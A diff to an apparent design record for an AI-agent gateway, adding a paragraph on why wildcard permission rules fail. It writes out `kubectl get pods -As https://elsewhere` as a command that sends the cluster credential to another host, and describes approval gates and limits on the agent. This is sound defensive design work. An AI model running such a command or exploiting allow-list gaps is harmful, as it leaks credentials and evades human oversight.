@@ -12,6 +12,8 @@ The agent cannot record an approval. The allow-list leaves out `audit.py record`
 
 The SDK runs on the owner's subscription token rather than an API key, at the owner's decision on the terms. If that stops working, the gateway can drive the Claude Code CLI headless instead, behind the same driver interface.
 
+Permission rules match command text with wildcards; they cannot parse a program's options. A rule allowing `kubectl get *` also allows `kubectl get pods -As https://elsewhere`, which sends the cluster credential to another host. So commands whose options can reach a credential, another host or another identity are not allow-listed at all. kubectl reads go through `kube_read.py`, which allows a fixed set of verbs and options, each in one plain form, and runs kubectl with no shell; git and journalctl, whose options can read or write any file, need an approval.
+
 ## Consequences
 
 - The allow-list is not a sandbox. Claude Code treats a fixed set of read-only shell commands as allowed in every mode, and applies path deny rules to them only on a best-effort basis. The deny-list narrows what the agent can read; the approval gate is what stops a change.
